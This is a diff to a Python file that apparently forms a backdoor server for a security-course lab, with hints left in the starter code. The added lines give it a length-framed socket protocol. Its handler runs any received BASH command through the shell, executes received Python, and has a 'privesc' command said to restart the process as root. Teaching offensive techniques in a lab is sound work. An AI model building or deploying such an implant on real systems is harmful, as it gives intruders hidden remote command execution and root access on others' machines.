@@ -13,8 +13,26 @@ import sys
 import time
 import contextlib
 import io
+import struct
+
 
 THIS_FILE = os.path.realpath(__file__)
+
+# Added for multiline
+
+def send_framed(sock, data: bytes):
+    sock.sendall(struct.pack(">I", len(data)) + data)
+
+def recv_framed(sock):
+    header = b""
+    while len(header) < 4:
+        header += sock.recv(4 - len(header))
+    msg_len = struct.unpack(">I", header)[0]
+    data = b""
+    while len(data) < msg_len:
+        data += sock.recv(msg_len - len(data)) 
+    return data
+
 
 def run_command(cmd, shell=True, capture_output=True, **kwargs):
     return subprocess.run(
@@ -106,7 +124,9 @@ def handle_conn(conn, addr):
         # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
         # For example, you could send a length value before any command, decide on null byte as ending,
         # base64 encode every command, etc
-        raw_data = conn.recv(1024)
+        #ADDED
+        raw_data = recv_framed(conn) 
+        # raw_data = conn.recv(1024)
         if not raw_data:
             return
         
@@ -124,26 +144,35 @@ def handle_conn(conn, addr):
             if command_type == "privesc":
                 print("Running privesc")
                 privesc()
-                conn.sendall(b"Privesc triggered: restarting as root")
+                # conn.sendall(b"Privesc triggered: restarting as root")
+                send_framed(conn, b"Privesc triggered: restarting as root")
             #Command 2: Python 
             elif command_type == "PY":
                 print("Running python")
                 result = handle_python_command(command_body)
-                conn.sendall(result.encode("utf-8", errors="replace"))
+                # conn.sendall(result.encode("utf-8", errors="replace"))
+                send_framed(conn, result.encode("utf-8", errors="replace"))
+                
             
             elif command_type == "BASH":
-                result= run_command(command_body)
-                output = result.stdout + result.stderr
-                conn.sendall(output.encode("utf-8", errors="replace"))
+                # result= run_command(command_body)
+                # output = result.stdout + result.stderr
+                # # conn.sendall(output.encode("utf-8", errors="replace"))
+                # send_framed(conn, output if output else b"[no output]")
+                proc = subprocess.run(command_body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = proc.stdout + proc.stderr  # both are bytes now, not strings
+                send_framed(conn, output if output else b"[no output]")
             else: 
-                conn.sendall(f"Unknown command: {command_type}".encode())
+                # conn.sendall(f"Unknown command: {command_type}".encode())
+                send_framed(conn, f"Unknown command: {command_type}".encode())
         # Think VERY carefully about how you will communicate between the client and server
         # You will need to make a custom protocol to transfer commands
         # try:
         #     conn.sendall(run_command("whoami").stdout.encode())
             # Process the communication data from 
         except Exception as e:
-            conn.sendall(f"error: {e}".encode())
+            # conn.sendall(f"error: {e}".encode())
+            send_framed(conn, f"error: {e}".encode())
 
 def main():
     kill_others()
